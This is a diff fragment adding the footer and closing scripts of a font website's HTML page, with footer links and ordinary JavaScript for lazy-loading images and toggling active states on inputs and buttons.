+				<li><a href="//webfonts.ffonts.net/" class="s28" title="Web Fonts"><span>Web Fonts</span></a></li>
+	
+		</ul>
+  <ul class="nvlist s11 lite lang lazy-background visible languagesfooter_icons">
+
+				<li>&nbsp;</li>
+		</ul>
+		</div>
+
+  
+		<hr class="clearfix w-100 d-md-none">
+  
+		<!-- Grid column -->
+		<div class="col-md-2 col-lg-2 mx-auto">
+  
+		  <!-- Links -->
+  
+		<ul class="list-unstyled thirdlistitemscolfooter">
+<li><a href="http://www.whatfontis.com" title="Font Finder" class="s26">Font Finder</a></li>
+
+
+		</ul>
+
+		</div>
+		<!-- Grid column -->
+  
+	  </div>
+	  <!-- Grid row -->
+  
+	</div>
+	<!-- Footer Links -->
+
+</footer>
+<!-- Footer -->
+
+
+
+
+
+<script id="rendered-js">
+  document.addEventListener("DOMContentLoaded", function () {
+  var lazyImages = [].slice.call(document.querySelectorAll("img.lazy"));;
+  if ("IntersectionObserver" in window && "IntersectionObserverEntry" in window && "intersectionRatio" in window.IntersectionObserverEntry.prototype) {
+    let lazyImageObserver = new IntersectionObserver(function (entries, observer) {
+      entries.forEach(function (entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target;
+		  lazyImage.src = lazyImage.dataset.src;
+          lazyImage.classList.remove("lazy");
+          lazyImageObserver.unobserve(lazyImage);
+
+        }
+      });
+    });
+
+    lazyImages.forEach(function (lazyImage) {
+      lazyImageObserver.observe(lazyImage);
+    });
+  }
+});
+
+  document.addEventListener("DOMContentLoaded", function() {
+  var lazyBackgrounds = [].slice.call(document.querySelectorAll(".lazy-background"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyBackgroundObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          entry.target.classList.add("visible");
+          lazyBackgroundObserver.unobserve(entry.target);
+        }
+      });
+    });
+
+    lazyBackgrounds.forEach(function(lazyBackground) {
+      lazyBackgroundObserver.observe(lazyBackground);
+    });
+  }
+});
+document.querySelectorAll('img.fontimage_cssgeneral[width][height]').forEach(img=>{
+  img.style.aspectRatio = `${img.getAttribute('width')} / ${img.getAttribute('height')}`;
+});
+const io = new IntersectionObserver(es=>{
+  es.forEach(e=>{
+    if(e.isIntersecting){
+      const im = e.target;
+      if(im.dataset.src){ im.src = im.dataset.src; }
+      io.unobserve(im);
+    }
+  });
+},{rootMargin:"200px"});
+document.querySelectorAll('img.fontimage_cssgeneral.lazy').forEach(im=>io.observe(im));
+</script>
+<script defer>
+document.addEventListener('DOMContentLoaded', function(){
+  document.addEventListener('click', function(e){
+    if (e.target && e.target.matches('input')) {
+      document.querySelectorAll('input:not(:checked)')
+        .forEach(function(el){ if (el.parentNode) { el.parentNode.classList.remove('active'); } });
+      document.querySelectorAll('input:checked')
+        .forEach(function(el){ if (el.parentNode) { el.parentNode.classList.add('active'); } });
+    }
+    if (e.target && e.target.matches('button')) {
+      document.querySelectorAll('.btn-slant')
+        .forEach(function(el){ el.classList.remove('active'); });
+      e.target.classList.add('active');
+    }
+  });
+});
+</script><style>
+  #fuse-privacy-tool {
+    font-size: 0.5rem;
+  }
+</style>
+<div data-fuse-privacy-tool></div>
+</body>
+</html>
